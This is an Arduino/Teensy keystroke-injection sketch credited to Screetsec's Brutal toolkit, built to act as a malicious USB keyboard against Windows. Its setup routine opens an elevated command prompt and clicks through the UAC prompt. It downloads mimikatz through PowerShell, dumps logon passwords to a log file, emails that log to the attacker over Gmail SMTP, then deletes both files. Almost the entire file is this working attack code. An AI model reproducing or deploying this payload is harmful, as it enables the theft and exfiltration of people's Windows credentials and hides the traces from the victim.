/*
Script Edit By : Edo Maland  [ Screetsec ]
Follow me on : www,github.com/Screetsec
Penetration OS from Indonesia : Dracos Linux
Link : www.dracos-linux.org
Forum : forum.dracos-linux.org

setting your account gmail in : https://www.google.com/settings/security/lesssecureapps
*/


#define FROM "FROM_SCREETSEC"

#define PASS "PASSWORD_SCREETSEC"

#define TO "KE_SCREETSEC"


String x64 = "https://github.com/Screetsec/Brutal/raw/master/tools/x64/mimikatz.exe";
String x32 = "https://github.com/Screetsec/Brutal/raw/master/tools/x32/mimikatz.exe";



int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif

void setup()
{

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while running
  digitalWrite(LED_PIN, HIGH);


  delay(3000);
  show_desktop();

  delay(3000);
  cmd_admin();

  delay(3000);
  send_altyes();

  delay(1000);
  Keyboard.print("ipconfig");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("CD %TMP%");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("For /F \"tokens=1\" %a in ('wmic OS get OSArchitecture ^| find \"bits\"') do (set OS=%a)");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();


  delay(500);
  Keyboard.print("  if %OS%==x64 (set link=\"" + x64 + "\") else (set link=\"" + x32 + "\")");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('%link%','mimikatz.exe')");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("mimikatz.exe>Log.txt");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("privilege::debug");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("sekurlsa::logonPasswords full");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("powershell");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$SMTPInfo.EnableSsl = $true");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('"FROM"', '"PASS"')");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$ReportEmail.From = '"FROM"'");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$ReportEmail.To.Add('"TO"')");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$ReportEmail.Subject = 'Windows Passwords Grabber'");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("del /Q Log.txt & del  /Q mimikatz.exe");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(2000);
  Keyboard.print("exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

}

void show_desktop(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_D);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void send_altyes(){
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }

void cmd_admin(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print("cmd");

  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void loop(){
    // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
